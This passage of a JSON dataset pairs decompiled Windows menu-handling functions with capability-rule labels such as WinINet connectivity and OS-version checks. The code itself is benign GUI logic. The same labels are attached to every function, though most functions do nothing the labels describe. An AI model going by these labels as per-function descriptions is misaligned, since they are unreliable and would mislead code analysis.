        "decompiled_code": "\nuint32_t __cdecl fcn.0044ce74(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t *piVar2;\n    code *in_ECX;\n    int32_t in_EDX;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = in_EAX;\n    if (in_EDX != 0) {\n        var_9h = 0;\n        while (var_9h == 0) {\n            piVar2 = fcn.0044f454();\n            if (piVar2 <= *in_EAX) break;\n            uVar1 = fcn.0044f464();\n            piVar2 = uVar1 & 0xffffff00;\n            if (*(arg_8h + -1) <= *(uVar1 + 0x3f) && *(uVar1 + 0x3f) != *(arg_8h + -1)) break;\n            piVar2 = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n            var_9h = piVar2;\n        }\n    }\n    return piVar2 & 0xffffff00 | var_9h;\n}\n",
        "token_count": 288
    },
    "0044ced4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044ced4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.0044f454();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.0044f454();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.0044f464();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.0044f464();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.0044ce74(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.0044ce74(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.0044f464(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.0044f464(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "0044d368": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044d368(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.0044ce54();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.004037f0();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x44fdb8;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 336
    },
    "0044d498": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044d498(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff84;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint lpmi;\n    uint var_35h;\n    uint32_t var_31h;\n    uint32_t var_2dh;\n    uint32_t var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_15h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack84 = &var_1h + 1;\n    var_8h = 0;\n    uStack88 = 0x44d6f3;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack92;\n    puVar1 = &var_1h + 1;\n    var_1h._0_1_ = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x0044d6d5;\n    fcn.00404660();\n    iVar4 = fcn.0044f454();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004039b8();\n                if (cVar3 != '\\0') goto code_r0x0044d534;\n            }\n            fcn.0044cafc(0x44d70c, var_8h);\n            fcn.00404948(0);\n        }\n    }\n    else {\n        var_25h = fcn.0044d9a8();\n    }\ncode_r0x0044d534:\n    uVar2 = sub.kernel32.dll_GetVersion_1();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.004049d4();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x483d94) |\n                *(*(in_EAX + 0x48) * 4 + 0x483d88) | *(*(in_EAX + 0x38) * 4 + 0x483d78) |\n                *(*(in_EAX + 0x39) * 4 + 0x483d80);\n        iVar4 = fcn.0044f454();\n        if (iVar4 < 1) {\n            uVar5 = fcn.00404a88();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff84 = param_2;\n            puVar1 = puStack84;\n        }\n        else {\n            uVar5 = fcn.00404a88();\n            uVar5 = fcn.0044d9a8(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff84 = param_2;\n            puVar1 = puStack84;\n        }\n        goto code_r0x0044d6d5;\n    }\n    lpmi = 0x2c;\n    var_35h = 0x3f;\n    iVar4 = fcn.0044fa10();\n    if (iVar4 == 0) {\ncode_r0x0044d574:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x0044d58a;\n        }\n        var_9h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.0044f02c();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x0044d574;\n        }\ncode_r0x0044d58a:\n        var_9h = 1;\n    }\n    fcn.004049d4();\n    var_31h = *((uVar2 & 0x7f) * 4 + 0x483dc8) | *(*(in_EAX + 0x3d) * 4 + 0x483dc0) | *(*(in_EAX + 0x48) * 4 + 0x483d9c)\n              | *(var_1h * 4 + 0x483dd0) | *(var_9h * 4 + 0x483dd8);\n    var_2dh = *(*(in_EAX + 0x38) * 4 + 0x483da8) | *(*(in_EAX + 0x39) * 4 + 0x483db8) |\n              *(*(in_EAX + 0x3a) * 4 + 0x483db0);\n    var_29h = *(in_EAX + 0x50);\n    var_25h = 0;\n    var_21h = 0;\n    var_1dh = 0;\n    var_15h = fcn.00404a88();\n    iVar4 = fcn.0044f454();\n    if (0 < iVar4) {\n        var_25h = fcn.0044d9a8();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff84 = param_2;\n    puVar1 = puStack84;\ncode_r0x0044d6d5:\n    puStack84 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff84;\n    fcn.004045c8(0x44d6fa);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 1517
    },
    "0044d878": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d878(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.0044d878();\n        return;\n    }\n    uVar2 = fcn.0044d9a8();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.0044d9a8(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.0044d9a8(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004039b8(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.0044d9a8();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x0044d938;\n        }\n    }\n    fcn.0044d738();\ncode_r0x0044d938:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 482
    },
    "0044d9a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044d9a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.0044ca50();\n        }\n        fcn.0044d738();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 191
    },
    "0044da38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044da84)\n// WARNING: Removing unreachable block (ram,0x0044da8e)\n\nvoid __cdecl fcn.0044da38(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = NULL;\n    uStack52 = 0x44dc1c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.0044fa10();\n    if ((iVar2 != 0) && (cVar1 = fcn.0045107c(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.00404660();\n    uVar5 = (arg_8h & 0x400) == 0;\n    if ((!uVar5) &&\n       ((uVar5 = var_ch == NULL,  uVar5 || ((uVar5 = *var_ch == '&',  uVar5 && (uVar5 = var_ch[1] == '\\0',  uVar5))))))\n    {\n        fcn.00404890();\n    }\n    fcn.004049d4();\n    if (uVar5) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.0042704c(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x0044dc06;\n    }\n    fcn.00426a20();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.004263f8();\n        fcn.00426404();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.00426138();\n            uVar3 = fcn.00404888(lprc, arg_8h);\n            uVar3 = fcn.00404a88(uVar3);\n            uVar3 = fcn.0042704c(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        else {\n            iVar2 = fcn.00425c78();\n            iVar4 = fcn.00425c78();\n            if (iVar2 == iVar4) {\n                fcn.00426138();\n                goto code_r0x0044dbe1;\n            }\n        }\n        fcn.00426138();\n    }\ncode_r0x0044dbe1:\n    uVar3 = fcn.00404888(lprc, arg_8h);\n    uVar3 = fcn.00404a88(uVar3);\n    uStackY120 = fcn.0042704c(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x0044dc06:\n    *in_FS_OFFSET = uStackY120;\n    fcn.004045c8(0x44dc23);\n    return;\n}\n",
        "token_count": 896
    },
    "0044dc48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044dc48(uint32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar auStack256 [212];\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack36;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        puStack36 = &fcn.0044dc48::var_10h;\n        uStack40 = &stack0xffffff00 | arg_8h & 0xff;\n        uStack44 = 0x44dc7e;\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "0044f02c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044f02c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.0044fa10();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 168
    },
    "0044f0a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f0a8(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    uint8_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_10h = 0;\n    uStack60 = 0x44f28a;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.00403a28();\n    cVar2 = fcn.004039b8();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.0044f05c(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.0044fa10();\n    var_ch = fcn.0044f02c();\n    fcn.004049d4();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_ch == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if ((*(in_EAX + 0x4c) == 0) || (cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))(),  cVar2 != '\\0')) {\n            *var_4h = -7;\n            bVar1 = false;\n        }\n        else {\n            *var_4h = 0x10;\n            if (!bVar5) {\n                *arg_8h = 0x10;\n            }\n            bVar1 = true;\n        }\n    }\n    else {\n        *var_4h = *(var_ch + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_ch + 0x30);\n        }\n        bVar1 = true;\n    }\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.004031a8();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004039b8();\n        uVar4 = *0x60;\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.00404660();\n    }\n    else {\n        fcn.0044cafc();\n        fcn.004048d4();\n    }\n    arg_8h_00 = *(uVar4 * 2 + 0x483df0) | 0x560;\n    fcn.0044da38(arg_8h_00, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.004045c8(0x44f291);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 943
    },
    "0044f2e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f2e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.0044f454(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0044f464();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.0044f32c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "0044f32c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f32c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.0044d9a8(*(in_EAX + 0x50), *(param_2 * 4 + 0x483d78));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0044f2e4();\n        }\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0044f380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f380(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x48484c != 2) || (iVar1 = fcn.0044f454(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.0044d9a8(*(in_EAX + 0x14), *(param_2 * 4 + 0x483d80));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 278
    },
    "0044f3f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f3f8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.0044f7b8();\n            fcn.0044d948();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0044f2e4();\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0044f464": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f464(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.0044ca50();\n    }\n    fcn.0041c4c8();\n    return;\n}\n",
        "token_count": 65
    },
    "0044f5e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f5e0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.0044ca50();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.004037f0();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.0041c4c8();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.0041c4c8();\n            fcn.0044f3f8();\n        }\n    }\n    fcn.0044d948();\n    fcn.0041c54c();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.0044f858;\n    if (in_EAX[0xd] != 0) {\n        fcn.0044d878();\n    }\n    fcn.0044f454();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 360
    },
    "0044f694": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f694(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.0044f454();\n        if (param_2 < iVar1) goto code_r0x0044f6ba;\n    }\n    fcn.0044ca50();\ncode_r0x0044f6ba:\n    iVar1 = fcn.0041c4c8();\n    fcn.0041c3a4();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.0044d878();\n    }\n    fcn.0044f454();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 238
    },
    "0044f858": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f858(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.0044d878();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            fcn.00451560();\n        }\n    }\n    else {\n        fcn.0044f858(0);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0044feb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044feb4(uint param_1, uint param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffbc;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_10h = 0;\n    var_ch = 0;\n    uStack40 = 0x44ffd6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    bVar1 = false;\n    var_4h = param_2;\n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x48483c + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                bVar1 = true;\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (bVar1) {\n        iVar2 = fcn.00404888(&var_ch);\n        uVar5 = iVar2 == 2;\n        fcn.00404ae8();\n        fcn.004049d4();\n        if (uVar5) {\n            fcn.00404888(&var_10h);\n            fcn.00404ae8();\n            in_stack_ffffffbc = var_4h;\n            fcn.00404948(0x44ffec, 0x450010, var_4h, 0x450004, 0x44fff8, var_10h);\n        }\n        else {\n            in_stack_ffffffbc = 0x450010;\n            fcn.00404948(0x450010, var_4h, 0x450004, 0x44fff8, *in_EAX);\n        }\n    }\n    else if (var_8h != 0) {\n        fcn.00404b70();\n    }\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.004045ec(0x44ffdd);\n    return;\n}\n",
        "token_count": 579
    },
    "00450014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
